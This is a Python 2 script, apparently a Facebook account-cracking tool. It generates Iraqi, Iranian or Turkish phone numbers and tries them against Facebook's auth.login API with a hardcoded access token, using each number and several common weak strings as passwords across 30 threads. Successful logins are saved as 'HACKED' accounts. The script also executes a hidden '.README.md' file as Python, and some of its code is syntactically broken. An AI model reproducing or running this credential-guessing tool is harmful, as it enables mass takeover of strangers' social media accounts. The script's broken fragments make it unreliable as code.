chk(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "-".join(uuid) 
  print("\n\n\x1b[37;1mYour ID : "+id) 
  try: 
    httpCaht = requests.get(https://raw.githubusercontent.com/HTS-EXPERT/Active/main/Active_Fast_1.txt").text 
    if id in httpCaht: 
      print("\033[92mYOUR ID IS ACTIVE.........\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[91mYOUR ID IS NOT ACTIVE @i4m_EXPERT.........\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print logo 
     chk() 
    
chk()




def menu():
    os.system('clear')
    print logo 
    print 42 * '\x1b[1;91m:'
    print '\x1b[1;94m[1]\x1b[1;92m zhmaray iraq    \x1b[1;91m[0]\x1b[1;91m Exit'
    print '\x1b[1;93m[2]\x1b[1;92m zhmaray iran'
    print '\x1b[1;91m[3]\x1b[1;92m zhmaray turkya'
    print 42 * '\x1b[1;91m:'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mSelect Option \x1b[1;93m>>>\x1b[1;95m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92m 750  751 752 770 772 773 774 780 781 782'
        try:
            c = raw_input('\x1b[1;96m codek halbzhera  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '901, 902, 903, 930, 933, 935, 936, 937, 938, 939'
        try:
            c = raw_input(' choose code  : ')
            k = '+98'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print '\x1b[1;96m322, 264, 416, 272, 472, 382, 312'
        try:
            c = raw_input(' choose code  : ')
            k = '+90'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;92m[\xe2\x9c\x93]\x1b[1;92m Please wait 15 min ...')
    time.sleep(0.1)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED EXPERT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[NOT HACK EXPERT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234554321'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED EXPERT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[NOT HACK EXPERT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                pass3 = '1234512345'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED EXPERT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass3 + '\n')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[NOT HACK EXPERT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass3 + '\n')
                cps.close()
                cpb.append(c + user + pass3)
            else:
                pass4 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[succsefell]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[secessfull]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass4 + '\n')
                cps.close()
                cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')
if __name__ == '__main__':
    menu()